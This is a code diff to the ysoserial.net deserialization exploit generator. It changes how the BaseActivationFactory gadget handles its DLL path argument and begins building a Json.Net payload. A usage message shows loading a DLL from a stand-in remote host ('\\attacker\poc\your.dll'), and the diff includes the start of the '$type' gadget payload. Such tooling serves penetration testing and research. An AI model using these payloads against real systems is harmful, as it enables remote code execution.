@@ -56,20 +56,19 @@ namespace ysoserial.Generators
             String targetPath = "";
             inputArgs.IsRawCmd = true;
 
-            if (!inputArgs.Cmd.ToLowerInvariant().EndsWith(".dll"))
+            if (!inputArgs.CmdFullString.ToLowerInvariant().EndsWith(".dll"))
             {
-                Console.WriteLine("This gadget loads remote/local file: -c argument should provide a file path to your DLL file\r\nUNC paths can be used for the remote DLL loading, like \\\\attacker\\poc\\your.dll\r\nThis gadget can only load files with DLL extension, as .dll extension will be added to the path during the deserialization\r\nExample: ysoserial.exe -g BaseActivationFactory -f Json.Net -c '\\\\\\\\attacker\\\\poc\\\\your.dll'");
+                Console.WriteLine("This gadget loads remote/local file: -c argument should provide a file path to your DLL file\r\nUNC paths can be used for the remote DLL loading, like \\\\attacker\\poc\\your.dll\r\nThis gadget can only load files with DLL extension, as .dll extension will be added to the path during the deserialization\r\nExample: ysoserial.exe -g BaseActivationFactory -f Json.Net -c '\\\\attacker\\poc\\your.dll'");
                 Environment.Exit(-1);
-            }
-            else
-            {
-                
-                targetPath = inputArgs.Cmd;
-                targetPath = targetPath.Substring(0, targetPath.Length - 4);
             }
 
             if (formatter.ToLower().Equals("json.net"))
             {
+                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;
+
+                //remove .dll from the targetPath - it will be added by the code during the deserialization
+                targetPath = inputArgs.CmdFullString;
+                targetPath = targetPath.Substring(0, targetPath.Length - 4);
 
                 payload = @"{
     '$type':'WinRT.BaseActivationFactory, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
